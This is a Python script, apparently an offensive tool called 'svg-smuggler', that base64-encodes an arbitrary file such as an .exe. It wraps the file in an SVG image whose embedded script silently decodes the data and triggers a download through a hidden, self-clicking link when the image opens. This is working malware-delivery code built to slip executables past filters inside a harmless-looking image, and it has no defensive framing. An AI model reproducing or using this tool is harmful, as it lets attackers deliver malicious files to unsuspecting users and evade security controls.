import base64
import sys


def base64_encode(file_path):
    with open(file_path, "rb") as file:
        return base64.b64encode(file.read()).decode('utf-8')

def create_svg(b64string, original_filename):
    svg_content = f"""<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" width="500" height="500">
    <text x="10" y="50" font-family="Arial" font-size="20" fill="black">Open this image in a new tab</text>
    <script type="application/ecmascript"><![CDATA[
        document.addEventListener("DOMContentLoaded", function() {{
            function base64ToArrayBuffer(base64) {{
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array(len);
                for (var i = 0; i < len; i++) {{ bytes[i] = binary_string.charCodeAt(i); }}
                return bytes.buffer;
            }}
            var file = '{b64string}';
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {{type: 'octet/stream'}});
            var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
            document.documentElement.appendChild(a);
            a.setAttribute('style', 'display: none');
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = '{original_filename}';
            a.click();
            window.URL.revokeObjectURL(url);
        }});
    ]]></script>
</svg>"""
    with open("output.svg", "w") as file:
        file.write(svg_content)


def main():
    try:
        if len(sys.argv[1]) < 1:
            print("[-] No file specified. Usage: python3 svg-smuggler.py sample.exe")
            return

        file_path = sys.argv[1]
        original_filename = file_path.split('/')[-1]

        b64data = base64_encode(file_path)
        print("[+] Reading and Converting to Base64")

        print("[+] Now creating the SVG")
        create_svg(b64data, original_filename)
        print("[+] SVG Written to output.svg")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()